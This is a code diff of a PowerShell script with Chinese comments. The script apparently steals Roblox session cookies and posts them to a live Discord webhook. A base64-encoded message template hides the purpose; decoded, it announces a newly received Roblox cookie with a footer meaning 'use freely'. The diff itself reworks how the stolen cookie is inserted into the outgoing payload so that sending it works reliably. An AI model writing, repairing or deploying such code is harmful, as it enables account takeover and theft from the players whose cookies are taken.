@@ -10,24 +10,21 @@ $uri = "https://discord.com/api/webhooks/1501523254404190209/qnfTbYgfNuOCOBbEQwu
 $embedBase64 = "eyJ0aXRsZSI6ICLmjqXmlLbliLDmlrDnmoRyb2Jsb3ggY29va2llIiwgImNvbG9yIjogMzQ0NzAwMywgImZpZWxkcyI6IFt7Im5hbWUiOiAiY29va2llIiwgInZhbHVlIjogImBgYCRjb29raWVgYGAifV0sICJmb290ZXIiOiB7InRleHQiOiAi5Y+v5Lul55uh5oOF5L2/55SoIn19"
 
 # 解密
-$decodedJson = [System.Text.Encoding]::UTF8.GetString(
-    [Convert]::FromBase64String($embedBase64)
-)
+# 解密 Base64 得到原始 JSON
+$decodedJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($embedBase64))
+
+# 【關鍵修正】手動將字串中的 "$cookie" 替換成變數 $cookie 的內容
+# 我們使用 [Regex]::Escape 是為了確保特殊字元不會干擾替換
+$finalJson = $decodedJson.Replace('$cookie', $cookie)
 
 # 轉成物件
-$embed = $decodedJson | ConvertFrom-Json
+$embed = $finalJson | ConvertFrom-Json
 
-# ⚠️ 確保 fields 存在且是陣列
-if ($embed.fields -and $embed.fields.Count -gt 0) {
-    $embed.fields[0].value = "```$cookie```"
-}
-
-# 組 payload
+# 組 payload 並發送
 $payload = @{
     embeds = @($embed)
 }
 
-# 發送
 Invoke-RestMethod -Uri $uri -Method Post `
     -Body ($payload | ConvertTo-Json -Depth 10) `
     -ContentType "application/json; charset=utf-8"
